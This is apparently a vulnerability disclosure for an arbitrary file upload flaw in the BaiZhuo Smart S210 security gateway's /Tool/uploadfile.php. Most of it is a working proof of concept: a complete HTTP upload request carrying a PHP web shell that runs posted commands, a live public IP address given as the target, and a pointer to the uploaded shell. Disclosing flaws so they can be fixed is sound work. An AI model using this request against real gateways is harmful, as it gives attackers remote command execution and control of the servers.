There is an arbitrary file upload vulnerability in BaiZhuo Networks Smart S210 multi-service security gateway intelligent management platform

# Vulnerability description

Beijing BaiZhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet.
BaiZhuo Networks Smart S210 multi-service security gateway intelligent management platform has an arbitrary file upload vulnerability. An attacker can exploit the vulnerability to gain server permissions and manipulate server files.

# Impact versions of vulnerabilities

Smart S210

# Vulnerability location

/Tool/uploadfile.php

# Details of the vulnerability

IP: https://183.248.30.228:8443/

The login interface is as shown in the figure.

<a href="https://smms.app/image/dexZf7L8z5wsVbk" target="_blank"><img src="https://s2.loli.net/2024/01/17/dexZf7L8z5wsVbk.png" ></a>

Construct POC and upload src.php file

```
POST /Tool/uploadfile.php? HTTP/1.1
Host: 183.248.30.228:8443
Cookie: PHPSESSID=fd847fe4280e50c2c3855ffdee69b8f8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
Content-Length: 405
Origin: https://183.248.30.228:8443
Referer: https://183.248.30.228:8443/Tool/uploadfile.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="file_upload"; filename="contents.php"
Content-Type: application/octet-stream

<?php
system($_POST["passwd"]);
?>
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="txt_path"

/home/src.php
-----------------------------13979701222747646634037182887--

```

<a href="https://smms.app/image/ratxfIDBUYEWFOk" target="_blank"><img src="https://s2.loli.net/2024/01/17/ratxfIDBUYEWFOk.png" ></a>

Visit /home/src.php to get webshell.

<a href="https://smms.app/image/7SF93kDMnlqTXvI" target="_blank"><img src="https://s2.loli.net/2024/01/17/7SF93kDMnlqTXvI.png" ></a>